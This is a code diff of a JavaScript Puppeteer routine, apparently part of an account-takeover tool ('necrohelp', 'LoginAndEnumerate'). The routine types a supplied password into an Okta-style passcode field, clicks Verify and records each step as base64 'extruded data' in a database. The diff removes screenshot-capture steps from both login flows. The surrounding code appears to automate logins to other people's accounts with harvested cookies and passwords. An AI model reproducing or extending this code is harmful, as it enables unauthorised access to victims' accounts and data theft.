@@ -125,20 +125,10 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
                 console.log(`[${taskId}] Detected DIRECT PASSWORD FLOW - password field already visible`)
                 await db.AddExtrudedData(taskId, 'auth_flow', Buffer.from('direct_password').toString('base64'))
 
-                // Save screenshot of direct password page to filesystem
-                const directPasswordPath = await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'direct_password_page')
-                if (directPasswordPath) {
-                    console.log(`[${taskId}] Direct password page screenshot saved to filesystem: ${directPasswordPath}`)
-                }
-
                 // Enter password directly
                 console.log(`[${taskId}] Entering password in direct field`)
                 await page.type('input[name="credentials.passcode"]', password, { delay: 100 })
                 await necrohelp.Sleep(1000)
-
-                // Take screenshot with password entered (masked)
-                await necrohelp.ScreenshotCurrentPage(page, taskId)
-                await db.AddExtrudedData(taskId, 'step', Buffer.from('04_password_entered_direct').toString('base64'))
 
                 // Click Verify button
                 console.log(`[${taskId}] Clicking Verify button`)
@@ -188,19 +178,11 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
                 await passwordButton.click()
                 await necrohelp.Sleep(3000)
 
-                // Take screenshot of password entry page
-                await necrohelp.ScreenshotCurrentPage(page, taskId)
-                await db.AddExtrudedData(taskId, 'step', Buffer.from('04_password_page').toString('base64'))
-
                 // Enter password
                 console.log(`[${taskId}] Entering password`)
                 await page.waitForSelector('input[name="credentials.passcode"]', { timeout: 10000 })
                 await page.type('input[name="credentials.passcode"]', password, { delay: 100 })
                 await necrohelp.Sleep(1000)
-
-                // Take screenshot with password entered (masked)
-                await necrohelp.ScreenshotCurrentPage(page, taskId)
-                await db.AddExtrudedData(taskId, 'step', Buffer.from('05_password_entered').toString('base64'))
 
                 // Click Verify button
                 console.log(`[${taskId}] Clicking Verify button`)
